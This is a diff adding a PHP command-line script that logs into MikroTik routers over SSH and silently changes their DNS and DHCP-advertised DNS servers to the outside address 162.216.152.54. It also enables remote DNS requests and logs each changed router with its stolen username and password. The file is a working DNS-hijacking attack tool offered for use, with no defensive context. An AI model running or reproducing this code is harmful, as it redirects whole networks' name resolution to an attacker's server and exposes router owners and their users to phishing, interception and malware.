@@ -1,0 +1,72 @@
+#!/usr/bin/php -H
+<?php
+
+if(!function_exists('ssh2_connect')) {
+	echo "[!] install the libssh2-php module\n";
+	exit(0);
+}
+
+error_reporting(NULL);
+ini_set("display_errors", 0);
+
+if(count($argv) < 5) {
+        echo "usage: $argv[0] -h -u -p\n";
+        echo "  -h hostname  (cannot be null )\n";
+        echo "  -u username  (cannot be null )\n";
+        echo "  -p password  (can be null    )\n";
+        echo "  -P port      (defaults to: 22)\n\n";
+        exit(0);
+}
+
+$opts = getopt("h:u:p:P:");
+
+foreach(array_keys($opts) as $opt) switch ($opt) {
+        case 'h':
+                $hostname = $opts['h'];
+                break;
+        case 'u':
+                $username = $opts['u'];
+                break;
+        case 'p':
+                $password = $opts['p'];
+                break;
+        case 'P':
+                $port     = $opts['P'];
+                break;
+}
+
+if(!isset($password)) $password == NULL;
+if(!isset($port)) $port = 22;
+
+if($ssh = ssh2_connect("$hostname", $port)) {
+	if(ssh2_auth_password($ssh, "$username", "$password")) {
+		$cmd  = "/ip dns set servers=162.216.152.54,8.8.8.8 allow-remote-requests=yes" . ';';
+		$cmd .= "/ip dhcp-server network set [/ip dhcp-server network find] dns-server=162.216.152.54,8.8.8.8";
+
+		$stream = ssh2_exec($ssh, $cmd);
+		stream_set_blocking($stream, true);
+		while($line = fgets($stream)) {
+			flush();
+			echo "$line\n";
+		}
+	 
+		fclose($stream);
+		if($password != NULL) {
+			echo "[+] Mikrotik (SSH) CHANGED -> $hostname:$port [$username - $password]\n";
+			system("echo [+] CHANGED -> $hostname:$port [$username - $password] >> logs/modificados.log");
+		} else {
+ 			echo "[+] Mikrotik (SSH) CHANGED -> $hostname:$port [$username]\n";
+			system("echo \"[+] Mikrotik (SSH) CHANGED -> $hostname:$port [$username]\" >> logs/modificados.log");
+		}
+	} else {
+		if($password != NULL) {
+			echo "[-] Mikrotik (SSH) ACCESS DENIED ON $hostname:$port [$username - $password]\n";
+		} else {
+			echo "[-] Mikrotik (SSH) ACCESS DENIED ON $hostname:$port [$username]\n";
+		}
+	}
+} else {
+	echo "[*] Mikrotik (SSH) CAN'T CONNECT TO $hostname:$port\n";
+}
+
+?>
